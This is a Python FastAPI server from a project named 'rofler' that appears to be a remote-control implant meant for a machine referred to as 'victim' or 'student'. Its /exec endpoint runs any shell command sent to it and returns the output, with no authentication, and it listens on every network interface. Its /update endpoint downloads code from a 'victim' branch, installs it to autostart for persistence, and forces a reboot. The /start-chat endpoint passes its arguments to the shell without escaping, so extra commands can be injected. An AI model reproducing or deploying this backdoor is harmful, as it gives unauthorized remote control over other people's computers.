import os
from fastapi import FastAPI
import uvicorn


app = FastAPI()


update_cmd = """
rm -rf ~/rofler
rm ~/.config/autostart/rofler
wget https://github.com/ImCocos/rofler/archive/refs/heads/victim.zip -P ~/;
unzip ~/victim.zip -d ~/;
rm ~/victim.zip;
mv ~/rofler-victim ~/rofler;
python -m venv ~/rofler/venv;
~/rofler/venv/bin/python -m pip install -r ~/rofler/requirements.txt;
mkdir ~/.config/autostart;
cp ~/rofler/rofler ~/.config/autostart/rofler;
systemctl reboot;
""".strip()


@app.get("/update")
async def root() -> dict:
    os.system(update_cmd)
    return {'status': 'ok'}

@app.post('/exec')
def exec(cmd: str) -> dict:
    os.system(cmd + ' > ~/rofler/.tmp & disown')
    with open(os.path.join(os.path.expanduser('~'), 'rofler/.tmp'), 'r') as file:
        raw = file.read()
    return {'status': 'ok', 'text': raw}

@app.post('/start-chat')
def start_chat(address: str, port, test_mode: bool = False) -> dict:
    if test_mode:
        start_chat_cmd = f'~/Git_projects/rofler/venv/bin/python ~/Git_projects/rofler/client.py {address} {port}'
        os.system(f'kitty --hold sh -c "{start_chat_cmd}" & disown')
    else:
        start_chat_cmd = f'/home/student/rofler/venv/bin/python /home/student/rofler/client.py {address} {port}'
        os.system(f'konsole -e /bin/bash --rcfile <(echo "{start_chat_cmd}") & disown')
    return {'status': 'ok'}


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=9999)
